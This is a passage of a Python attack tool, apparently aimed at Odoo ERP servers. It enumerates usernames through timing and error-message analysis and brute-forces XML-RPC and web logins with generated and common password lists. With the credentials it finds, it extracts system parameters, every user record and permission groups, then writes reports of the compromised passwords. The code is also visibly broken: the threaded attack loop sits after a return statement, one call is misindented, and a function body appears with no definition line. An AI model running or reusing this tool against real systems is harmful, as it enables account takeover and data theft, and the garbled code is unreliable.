        return list(set(found_users))  # Remove duplicates
        
    def _test_login_attempt(self, username, password):
        """Make a login attempt for timing/error analysis."""
        transport = EnhancedTimeoutTransport(
            timeout=self.timeout,
            use_https=self.use_ssl,
            disable_ssl_verify=self.disable_ssl_verify
        )
        common_proxy = xmlrpc.client.ServerProxy(self.common_url, transport=transport)
        return common_proxy.login(self.selected_database, username, password)
        
    def _validate_user_existence(self, username):
        """Validate user existence with multiple methods and return confidence score."""
        confidence = 0.0
        
        # Test 1: Timing analysis
        try:
            timings = []
            for _ in range(2):
                start_time = time.time()
                try:
                    self._test_login_attempt(username, 'definitely_wrong_password_12345')
                except:
                    pass
                timings.append(time.time() - start_time)
                
            avg_timing = sum(timings) / len(timings)
            if avg_timing > 0.5:  # Slower response suggests user processing
                confidence += 0.3
                
        except Exception as e:
            print_debug(f"Timing validation failed for {username}: {e}")
            
        # Test 2: Error message analysis
        try:
            self._test_login_attempt(username, 'wrong_password')
        except xmlrpc.client.Fault as fault:
            error_msg = fault.faultString.lower()
            if 'password' in error_msg and ('wrong' in error_msg or 'invalid' in error_msg):
                confidence += 0.4  # User exists but wrong password
            elif 'locked' in error_msg or 'disabled' in error_msg:
                confidence += 0.5  # User exists but locked
        except Exception:
            pass
            
        # Test 3: Context validation (common usernames get lower confidence)
        if username in ['admin', 'user', 'test']:
            confidence *= 0.8  # Reduce confidence for very common names
            
        return min(confidence, 1.0)
        
    def _get_detection_method(self, username, timing_users, error_users, web_users):
        """Determine which method detected the user."""
        methods = []
        if username in timing_users:
            methods.append('timing')
        if username in error_users:
            methods.append('error_analysis')
        if username in web_users:
            methods.append('web_interface')
        return '+'.join(methods) if methods else 'unknown'
        
    def _perform_password_attacks(self):
        """Perform password attacks."""
        print_info("Starting password attacks...")
        
        # Determine users to test
        users_to_test = []
        if self.results['users_found']:
            users_to_test = [user['username'] for user in self.results['users_found'] if user['confidence'] > 0.7]
        
        if not users_to_test:
            users_to_test = ['admin']  # Fallback to admin if no users found
            print_warning("No high-confidence users found, falling back to 'admin'")
        
        print_info(f"Testing credentials for users: {', '.join(users_to_test)}")
        
        # Generate password list
        password_generator = AdvancedPasswordGenerator(self.results['target_info'])
        keywords = [self.host, self.selected_database, 'odoo', 'admin', 'company']
        passwords = password_generator.generate_context_passwords(keywords, 1000)
        
        # Add common passwords
        passwords.extend([
            'admin', 'password', '123456', 'admin123', 'password123',
            'odoo', 'openerp', 'demo', 'test', '12345', 'qwerty'
        ])
        
        # Remove duplicates
        passwords = list(set(passwords))
        
        print_info(f"Testing {len(users_to_test)} users with {len(passwords)} passwords")
        
        # Perform attacks with threading for efficiency
        self._threaded_password_attack(users_to_test, passwords)
        
        if self.results['valid_credentials']:
            print_success(f"Found {len(self.results['valid_credentials'])} valid credentials!")
            for creds in self.results['valid_credentials']:
                print_success(f"  {creds['user']} : {creds['password']}")
        else:
            print_error("No valid credentials found")
            
    def _threaded_password_attack(self, users, passwords, max_threads=5):
        """Perform threaded password attack."""
        def test_credential(user, password):
            try:
                transport = EnhancedTimeoutTransport(
                    timeout=self.timeout,
                    use_https=self.use_ssl,
                    disable_ssl_verify=self.disable_ssl_verify
                )
                common_proxy = xmlrpc.client.ServerProxy(self.common_url, transport=transport)
                uid = common_proxy.login(self.selected_database, user, password)
                
                if uid:
                    self.results['valid_credentials'].append({
                        'user': user,
                        'password': password,
                        'uid': uid,
                        'database': self.selected_database
                    })
                    print_success(f"Valid credentials found: {user}:{password}")
                    self.logger.info(f"Valid credentials: {user}:{password} on {self.selected_database}")
                    return True
                    
            except xmlrpc.client.Fault as fault:
                fault_msg = fault.faultString
                # Handle specific Odoo error cases
                if "does not appear to be an IPv4 or IPv6 address" in fault_msg:
                    print_debug(f"IP resolution issue for {user}:{password} - server misconfiguration")
                    # This might actually indicate the login attempt reached the server
                    # but failed due to hostname resolution issues in Odoo's security check
                    self._handle_hostname_resolution_error(user, password, fault_msg)
                elif "Wrong login ID or password" in fault_msg:
                    print_debug(f"Invalid credentials: {user}:{password}")
                elif "password" in fault_msg.lower():
                    print_debug(f"Password-related error for {user}:{password}")
                else:
                    print_debug(f"Login failed for {user}:{password} - {fault_msg}")
            except Exception as e:
                print_debug(f"Error testing {user}:{password} - {e}")
                
            return False
            # Use ThreadPoolExecutor for concurrent testing
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                futures = []
                
                for user in users:
                    for password in passwords:
                        future = executor.submit(test_credential, user, password)
                        futures.append(future)
                        
                        # Add small delay to avoid overwhelming the server
                        time.sleep(0.1)
                        
                # Process completed futures
                for future in as_completed(futures):
                    try:
                        if future.result():
                            # Found valid credentials, could break here if desired
                            pass
                    except Exception as e:
                        print_debug(f"Future execution error: {e}")
                        
    def _handle_hostname_resolution_error(self, user, password, fault_msg):
        """Handle hostname resolution errors that might indicate server issues."""
        print_warning(f"Server hostname resolution issue detected for {user}:{password}")
        
        # This error suggests the login attempt reached the authentication layer
        # but failed due to Odoo's IP address validation in _assert_can_auth()
        # This could be a server misconfiguration that might affect legitimate users too
        
        self.results['security_issues'].append({
            'type': 'Server Misconfiguration',
            'description': f'Hostname resolution error in authentication: {fault_msg}',
            'severity': 'Medium',
            'recommendation': 'Check Odoo server configuration for proper hostname/IP handling'
        })
        
        # Try alternative connection methods
        self._try_alternative_login_methods(user, password)
        
    def _try_alternative_login_methods(self, user, password):
        """Try alternative login methods when hostname resolution fails."""
        print_info(f"Attempting alternative login methods for {user}...")
        
        # Method 1: Try with direct IP if hostname was used
        if not self.host.replace('.', '').isdigit():  # If host is not an IP
            try:
                import socket
                ip_address = socket.gethostbyname(self.host)
                print_info(f"Resolved {self.host} to {ip_address}, trying direct IP connection...")
                
                # Create alternative URLs with IP
                protocol = "https" if self.use_ssl else "http"
                alt_common_url = f"{protocol}://{ip_address}:{self.port}/xmlrpc/2/common"
                
                transport = EnhancedTimeoutTransport(
                    timeout=self.timeout,
                    use_https=self.use_ssl,
                    disable_ssl_verify=self.disable_ssl_verify
                )
                alt_common_proxy = xmlrpc.client.ServerProxy(alt_common_url, transport=transport)
                uid = alt_common_proxy.login(self.selected_database, user, password)
                
                if uid:
                    print_success(f"Alternative method successful! Valid credentials: {user}:{password}")
                    self.results['valid_credentials'].append({
                        'user': user,
                        'password': password,
                        'uid': uid,
                        'database': self.selected_database,
                        'method': 'direct_ip'
                    })
                    return True
                    
            except Exception as e:
                print_debug(f"Alternative IP method failed: {e}")
        
        # Method 2: Try web-based authentication
        try:
            self._try_web_based_login(user, password)
        except Exception as e:
            print_debug(f"Web-based login attempt failed: {e}")
            
        return False
        
    def _try_web_based_login(self, user, password):
        """Try web-based login as alternative method."""
        print_info("Attempting web-based authentication...")
        
        session = requests.Session()
        if self.disable_ssl_verify:
            session.verify = False
            
        try:
            # Get login page
            login_url = f"{self.base_url}/web/login"
            response = session.get(login_url, timeout=self.timeout)
            
            if response.status_code == 200:
                # Extract CSRF token if present
                csrf_token = None
                csrf_match = re.search(r'name="csrf_token"[^>]*value="([^"]*)"', response.text)
                if csrf_match:
                    csrf_token = csrf_match.group(1)
                
                # Prepare login data
                login_data = {
                    'db': self.selected_database,
                    'login': user,
                    'password': password,
                }
                
                if csrf_token:
                    login_data['csrf_token'] = csrf_token
                
                # Attempt login
                login_response = session.post(login_url, data=login_data, timeout=self.timeout)
                
                # Check for successful login indicators
                if login_response.status_code == 200:
                    if '/web' in login_response.url and 'login' not in login_response.url:
                        print_success(f"Web-based login successful: {user}:{password}")
                        self.results['valid_credentials'].append({
                            'user': user,
                            'password': password,
                            'uid': 'unknown',
                            'database': self.selected_database,
                            'method': 'web_based'
                        })
                        return True
                    elif "Wrong login" not in login_response.text and "Invalid" not in login_response.text:
                        # Might be successful but redirected
                        print_info(f"Possible successful web login for {user}:{password} (needs verification)")
                        
        except Exception as e:
            print_debug(f"Web-based login error: {e}")
            
        return False
                    
            # Add bypass techniques for hostname resolution issues
        self._add_bypass_techniques()
        
    def _add_bypass_techniques(self):
        """Add additional bypass techniques for common Odoo authentication issues."""
        print_info("Adding advanced bypass techniques...")
        
        # Technique 1: Test for database creation bypass
        self._test_database_creation_bypass()
        
        # Technique 2: Test for XML-RPC method enumeration
        self._test_xmlrpc_method_enumeration()
        
        # Technique 3: Test for version disclosure
        self._test_version_disclosure_methods()
        
    def _test_database_creation_bypass(self):
        """Test if database creation can bypass authentication restrictions."""
        try:
            transport = EnhancedTimeoutTransport(
                timeout=self.timeout,
                use_https=self.use_ssl,
                disable_ssl_verify=self.disable_ssl_verify
            )
            db_proxy = xmlrpc.client.ServerProxy(self.db_url, transport=transport)
            
            # Test if we can call database methods without proper authentication
            test_methods = ['list', 'server_version', 'list_lang']
            
            for method in test_methods:
                try:
                    if hasattr(db_proxy, method):
                        result = getattr(db_proxy, method)()
                        print_success(f"Database method '{method}' accessible: {result}")
                        
                        self.results['security_issues'].append({
                            'type': 'Unauthenticated Database Access',
                            'description': f'Database method "{method}" accessible without authentication',
                            'severity': 'Medium'
                        })
                except Exception as e:
                    print_debug(f"Database method {method} test failed: {e}")
                    
        except Exception as e:
            print_debug(f"Database creation bypass test failed: {e}")
            
    def _test_xmlrpc_method_enumeration(self):
        """Test for XML-RPC method enumeration."""
        try:
            transport = EnhancedTimeoutTransport(
                timeout=self.timeout,
                use_https=self.use_ssl,
                disable_ssl_verify=self.disable_ssl_verify
            )
            common_proxy = xmlrpc.client.ServerProxy(self.common_url, transport=transport)
            
            # Test common methods that might be exposed
            test_methods = [
                'version',
                'about', 
                'timezone_get',
                'server_version',
                'login_message'
            ]
            
            exposed_methods = []
            for method in test_methods:
                try:
                    if hasattr(common_proxy, method):
                        result = getattr(common_proxy, method)()
                        exposed_methods.append(method)
                        print_info(f"Exposed method '{method}': {result}")
                except Exception as e:
                    print_debug(f"Method {method} test failed: {e}")
                    
            if exposed_methods:
                self.results['security_issues'].append({
                    'type': 'Information Disclosure',
                    'description': f'Exposed XML-RPC methods: {", ".join(exposed_methods)}',
                    'severity': 'Low'
                })
                
        except Exception as e:
            print_debug(f"XML-RPC method enumeration failed: {e}")
            
    def _test_version_disclosure_methods(self):
        """Test various methods to disclose version information."""
        version_sources = []
        
        try:
            # Method 1: XML-RPC version call
            transport = EnhancedTimeoutTransport(
                timeout=self.timeout,
                use_https=self.use_ssl,
                disable_ssl_verify=self.disable_ssl_verify
            )
            common_proxy = xmlrpc.client.ServerProxy(self.common_url, transport=transport)
            version_info = common_proxy.version()
            version_sources.append(f"XML-RPC: {version_info}")
            
        except Exception as e:
            print_debug(f"XML-RPC version disclosure failed: {e}")
            
        try:
            # Method 2: HTTP headers analysis
            response = requests.get(self.base_url, timeout=self.timeout, verify=not self.disable_ssl_verify)
            server_header = response.headers.get('Server', '')
            if 'odoo' in server_header.lower():
                version_sources.append(f"HTTP Server header: {server_header}")
                
        except Exception as e:
            print_debug(f"HTTP header version disclosure failed: {e}")
        
        try:
            # Method 3: Static file analysis
            static_urls = [
                '/web/static/src/js/boot.js',
                '/web/static/src/js/framework/core.js',
                '/web/static/lib/jquery/jquery.js'
            ]
            
            for static_url in static_urls:
                try:
                    response = requests.get(
                        f"{self.base_url}{static_url}", 
                        timeout=5, 
                        verify=not self.disable_ssl_verify
                    )
                    if response.status_code == 200:
                        # Look for version patterns
                        version_patterns = [
                            r'odoo\.define\([\'"]([^\'\"]*)[\'"]',
                            r'version["\s:]+([0-9]+\.[0-9]+)',
                            r'@version\s+([0-9]+\.[0-9]+)'
                        ]
                        
                        for pattern in version_patterns:
                            matches = re.findall(pattern, response.text, re.IGNORECASE)
                            if matches:
                                version_sources.append(f"Static file {static_url}: {matches[0]}")
                                break
                except:
                    continue
                    
        except Exception as e:
            print_debug(f"Static file version disclosure failed: {e}")
        
        if version_sources:
            print_success(f"Version information gathered from {len(version_sources)} sources")
            for source in version_sources:
                print_info(f"  {source}")
                
            self.results['system_info']['version_sources'] = version_sources
        """Connect with valid credentials."""
        try:
            transport = EnhancedTimeoutTransport(
                timeout=self.timeout,
                use_https=self.use_ssl,
                disable_ssl_verify=self.disable_ssl_verify
            )
            common_proxy = xmlrpc.client.ServerProxy(self.common_url, transport=transport)
            uid = common_proxy.login(self.selected_database, creds['user'], creds['password'])
            return uid
        except Exception as e:
            print_error(f"Failed to connect with credentials {creds['user']}: {e}")
            return None
            
    def _extract_system_information(self, uid, creds):
        """Extract system information using valid credentials."""
        print_info(f"Extracting system information for user: {creds['user']}")
        
        try:
            transport = EnhancedTimeoutTransport(
                timeout=self.timeout,
                use_https=self.use_ssl,
                disable_ssl_verify=self.disable_ssl_verify
            )
            object_proxy = xmlrpc.client.ServerProxy(self.object_url, transport=transport)
            
            # Get system parameters
            try:
                system_params = object_proxy.execute_kw(
                    self.selected_database, uid, creds['password'],
                    'ir.config_parameter', 'search_read',
                    [[]], {'fields': ['key', 'value']}
                )
                self.results['system_info']['parameters'] = system_params
                print_success(f"Extracted {len(system_params)} system parameters")
            except Exception as e:
                print_debug(f"Failed to get system parameters: {e}")
                
            # Get database information
            try:
                db_info = object_proxy.execute_kw(
                    self.selected_database, uid, creds['password'],
                    'ir.module.module', 'search_read',
                    [['state', '=', 'installed']], {'fields': ['name', 'latest_version']}
                )
                self.results['system_info']['installed_modules'] = db_info
                print_success(f"Found {len(db_info)} installed modules")
            except Exception as e:
                print_debug(f"Failed to get module information: {e}")
                
            # Get company information
            try:
                company_info = object_proxy.execute_kw(
                    self.selected_database, uid, creds['password'],
                    'res.company', 'search_read',
                    [[]], {'fields': ['name', 'email', 'website', 'phone']}
                )
                self.results['system_info']['companies'] = company_info
                print_success(f"Found {len(company_info)} companies")
            except Exception as e:
                print_debug(f"Failed to get company information: {e}")
                
        except Exception as e:
            print_error(f"System information extraction failed: {e}")
            
    def _extract_user_information(self, uid, creds):
        """Extract user information."""
        print_info("Extracting user information...")
        
        try:
            transport = EnhancedTimeoutTransport(
                timeout=self.timeout,
                use_https=self.use_ssl,
                disable_ssl_verify=self.disable_ssl_verify
            )
            object_proxy = xmlrpc.client.ServerProxy(self.object_url, transport=transport)
            
            # Get all users
            users = object_proxy.execute_kw(
                self.selected_database, uid, creds['password'],
                'res.users', 'search_read',
                [[]], {'fields': ['login', 'name', 'email', 'active', 'groups_id']}
            )
            
            self.results['system_info']['all_users'] = users
            print_success(f"Extracted information for {len(users)} users")
            
            # Get user groups/permissions
            groups = object_proxy.execute_kw(
                self.selected_database, uid, creds['password'],
                'res.groups', 'search_read',
                [[]], {'fields': ['name', 'category_id', 'users']}
            )
            
            self.results['system_info']['user_groups'] = groups
            print_success(f"Found {len(groups)} user groups")
            
        except Exception as e:
            print_error(f"User information extraction failed: {e}")
            
    def _check_user_privileges(self, uid, creds):
        """Check user privileges and access levels."""
        print_info("Checking user privileges...")
        
        try:
            transport = EnhancedTimeoutTransport(
                timeout=self.timeout,
                use_https=self.use_ssl,
                disable_ssl_verify=self.disable_ssl_verify
            )
            object_proxy = xmlrpc.client.ServerProxy(self.object_url, transport=transport)
            
            # Check if user is admin
            user_info = object_proxy.execute_kw(
                self.selected_database, uid, creds['password'],
                'res.users', 'read',
                [uid], {'fields': ['groups_id']}
            )
            
            # Check for dangerous permissions
            dangerous_models = [
                'ir.config_parameter',
                'ir.module.module',
                'res.users',
                'ir.model.access',
                'ir.rule'
            ]
            
            privileges = {}
            for model in dangerous_models:
                try:
                    # Test read access
                    object_proxy.execute_kw(
                        self.selected_database, uid, creds['password'],
                        model, 'search', [[]], {'limit': 1}
                    )
                    privileges[model] = 'read'
                    
                    # Test write access (without actually writing)
                    try:
                        object_proxy.execute_kw(
                            self.selected_database, uid, creds['password'],
                            model, 'check_access_rights', ['write']
                        )
                        privileges[model] = 'write'
                    except:
                        pass
                        
                except Exception as e:
                    print_debug(f"No access to {model}: {e}")
                    
            if privileges:
                print_warning(f"User has access to sensitive models: {list(privileges.keys())}")
                self.results['security_issues'].append({
                    'type': 'Excessive Privileges',
                    'description': f'User {creds["user"]} has access to sensitive models: {list(privileges.keys())}',
                    'severity': 'High'
                })
            else:
                print_success("User appears to have limited privileges")
                
        except Exception as e:
            print_error(f"Privilege checking failed: {e}")
            
    def generate_report(self):
        """Generate comprehensive penetration testing report."""
        print_section("GENERATING PENETRATION TEST REPORT")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"odoo_pentest_report_{timestamp}.json"
        html_report_file = f"odoo_pentest_report_{timestamp}.html"
        
        # Save JSON report
        try:
            with open(report_file, 'w') as f:
                json.dump(self.results, f, indent=2, default=str)
            print_success(f"JSON report saved: {report_file}")
        except Exception as e:
            print_error(f"Failed to save JSON report: {e}")
            
        # Generate HTML report
        self._generate_html_report(html_report_file)
        
        # Print summary
        self._print_summary()
        
    def _generate_html_report(self, filename):
        """Generate HTML report."""
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Odoo Penetration Test Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .header {{ background-color: #2c3e50; color: white; padding: 20px; text-align: center; }}
        .section {{ margin: 20px 0; padding: 15px; border-left: 4px solid #3498db; }}
        .critical {{ border-left-color: #e74c3c; }}
        .high {{ border-left-color: #f39c12; }}
        .medium {{ border-left-color: #f1c40f; }}
        .low {{ border-left-color: #27ae60; }}
        .info {{ border-left-color: #3498db; }}
        table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
        .credentials {{ background-color: #ffebee; padding: 10px; border-radius: 5px; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Odoo Penetration Test Report</h1>
        <p>Target: {self.results['target_info'].get('target_url', 'Unknown')}</p>
        <p>Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
    
    <div class="section info">
        <h2>Executive Summary</h2>
        <p>This report contains the results of a comprehensive security assessment of the Odoo instance.</p>
        <ul>
            <li>Databases found: {len(self.results.get('databases', []))}</li>
            <li>Users enumerated: {len(self.results.get('users_found', []))}</li>
            <li>Valid credentials: {len(self.results.get('valid_credentials', []))}</li>
            <li>Vulnerabilities: {len(self.results.get('vulnerabilities', []))}</li>
            <li>Security issues: {len(self.results.get('security_issues', []))}</li>
        </ul>
    </div>
"""

        # Add vulnerabilities section
        if self.results.get('vulnerabilities'):
            html_content += """
    <div class="section critical">
        <h2>Known Vulnerabilities</h2>
        <table>
            <tr><th>CVE</th><th>Description</th><th>Severity</th></tr>
"""
            for vuln in self.results['vulnerabilities']:
                html_content += f"""
            <tr>
                <td>{vuln.get('cve', 'N/A')}</td>
                <td>{vuln.get('description', 'Unknown')}</td>
                <td>{vuln.get('severity', 'Unknown')}</td>
            </tr>
"""
            html_content += "        </table>\n    </div>\n"
            
        # Add credentials section
        if self.results.get('valid_credentials'):
            html_content += """
    <div class="section critical">
        <h2>Compromised Credentials</h2>
        <div class="credentials">
"""
            for creds in self.results['valid_credentials']:
                html_content += f"<p><strong>Database:</strong> {creds.get('database')} | <strong>User:</strong> {creds.get('user')} | <strong>Password:</strong> {creds.get('password')}</p>\n"
            html_content += "        </div>\n    </div>\n"
            
        # Add security issues
        if self.results.get('security_issues'):
            html_content += """
    <div class="section high">
        <h2>Security Issues</h2>
        <ul>
"""
            for issue in self.results['security_issues']:
                html_content += f"<li><strong>[{issue.get('severity', 'Unknown')}]</strong> {issue.get('description', 'No description')}</li>\n"
            html_content += "        </ul>\n    </div>\n"
            
        html_content += """
</body>
</html>
"""

        try:
            with open(filename, 'w') as f:
                f.write(html_content)
            print_success(f"HTML report saved: {filename}")
        except Exception as e:
            print_error(f"Failed to save HTML report: {e}")
            
    def _print_summary(self):
        """Print assessment summary."""
        print_section("ASSESSMENT SUMMARY")
        
        print(f"{Colors.CYAN}Target Information:{Colors.RESET}")
        print(f"  Host: {self.host}:{self.port}")
        print(f"  Protocol: {'HTTPS' if self.use_ssl else 'HTTP'}")
        print(f"  Databases: {len(self.results.get('databases', []))}")
        
        if self.results.get('target_info', {}).get('version'):
            print(f"  Version: {self.results['target_info']['version']}")
            
        print(f"\n{Colors.CYAN}Security Assessment Results:{Colors.RESET}")
        print(f"  Vulnerabilities found: {Colors.RED}{len(self.results.get('vulnerabilities', []))}{Colors.RESET}")
        print(f"  Security issues: {Colors.YELLOW}{len(self.results.get('security_issues', []))}{Colors.RESET}")
        print(f"  Valid credentials: {Colors.RED if self.results.get('valid_credentials') else Colors.GREEN}{len(self.results.get('valid_credentials', []))}{Colors.RESET}")
        print(f"  Users enumerated: {Colors.CYAN}{len(self.results.get('users_found', []))}{Colors.RESET}")
        print(f"  Master passwords: {Colors.RED if self.results.get('master_passwords') else Colors.GREEN}{len(self.results.get('master_passwords', []))}{Colors.RESET}")
        
        # Display enumerated users
        if self.results.get('users_found'):
            print(f"\n{Colors.CYAN}Enumerated Users:{Colors.RESET}")
            for user_info in self.results['users_found']:
                confidence_color = Colors.GREEN if user_info['confidence'] > 0.8 else Colors.YELLOW if user_info['confidence'] > 0.6 else Colors.RED
                print(f"  {confidence_color}{user_info['username']}{Colors.RESET} (confidence: {user_info['confidence']:.2f})")
                
        # Display master passwords
        if self.results.get('master_passwords'):
            print(f"\n{Colors.RED}{Colors.BOLD}CRITICAL: Master passwords found!{Colors.RESET}")
            for mp in self.results['master_passwords']:
                print(f"  {Colors.RED}{mp['password']}{Colors.RESET} (confidence: {mp['confidence']}, source: {mp.get('source', 'unknown')})")
        
        # Check for hostname resolution issues
        hostname_issues = [issue for issue in self.results.get('security_issues', []) 
                          if 'hostname resolution' in issue.get('description', '').lower()]
        
        if hostname_issues:
            print(f"\n{Colors.YELLOW}{Colors.BOLD}WARNING: Hostname Resolution Issues Detected{Colors.RESET}")
            print(f"  The target server appears to have configuration issues that may affect")
            print(f"  both legitimate users and security testing. Consider:")
            print(f"  - Testing with direct IP address instead of hostname")
            print(f"  - Checking server's network configuration")
            print(f"  - Verifying DNS resolution on the target")
        
        if self.results.get('valid_credentials'):
            print(f"\n{Colors.RED}{Colors.BOLD}CRITICAL: Valid credentials found!{Colors.RESET}")
            for creds in self.results['valid_credentials']:
                method = creds.get('method', 'xmlrpc')
                print(f"  {creds['user']}:{creds['password']} on {creds['database']} (via {method})")
                
        print(f"\n{Colors.CYAN}Recommendations:{Colors.RESET}")
        recommendations = [
            "Change all default passwords immediately",
            "Implement strong password policies", 
            "Disable database listing if not required",
            "Update Odoo to the latest version",
            "Implement network segmentation",
            "Enable audit logging",
            "Fix hostname resolution issues in server configuration",
            "Regular security assessments"
        ]
        
        for i, rec in enumerate(recommendations, 1):
            print(f"  {i}. {rec}")
            
        # Additional troubleshooting section
        if hostname_issues:
            print(f"\n{Colors.CYAN}Troubleshooting Hostname Issues:{Colors.RESET}")
            print(f"  1. Try running the scan with the server's IP address instead of hostname")
            print(f"  2. Check if the server's /etc/hosts file has proper entries")
            print(f"  3. Verify DNS resolution from the server's perspective")
            print(f"  4. Consider firewall or proxy configuration issues")
            print(f"  5. Check Odoo's configuration for proper IP/hostname handling")

# --- Main Execution ---
def main():
    """Main execution function."""
    print_banner()
    
    try:
        # Get target information
        host = input(f"{Colors.YELLOW}Target Host: {Colors.RESET}").strip()
        if not host:
            print_error("Host is required")
            return
            
        port = input(f"{Colors.YELLOW}Port [8069]: {Colors.RESET}").strip()
        port = int(port) if port else 8069
        
        use_ssl = input(f"{Colors.YELLOW}Use HTTPS? (y/N): {Colors.RESET}").lower().startswith('y')
        
        disable_ssl_verify = False
        if use_ssl:
            disable_ssl_verify = input(f"{Colors.YELLOW}Disable SSL verification? (y/N): {Colors.RESET}").lower().startswith('y')
            
        timeout = input(f"{Colors.YELLOW}Timeout in seconds [10]: {Colors.RESET}").strip()
        timeout = int(timeout) if timeout else 10
        
        silent = input(f"{Colors.YELLOW}Silent mode? (Y/n): {Colors.RESET}").lower() != 'n'
        
        # Initialize and run framework
        framework = OdooPentestFramework(
            host=host,
            port=port,
            timeout=timeout,
            use_ssl=use_ssl,
            disable_ssl_verify=disable_ssl_verify,
            silent=silent
        )
        
        framework.run_comprehensive_assessment()
        
    except KeyboardInterrupt:
        print_error("\nProgram interrupted by user")
    except Exception as e:
        print_error(f"Critical error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
            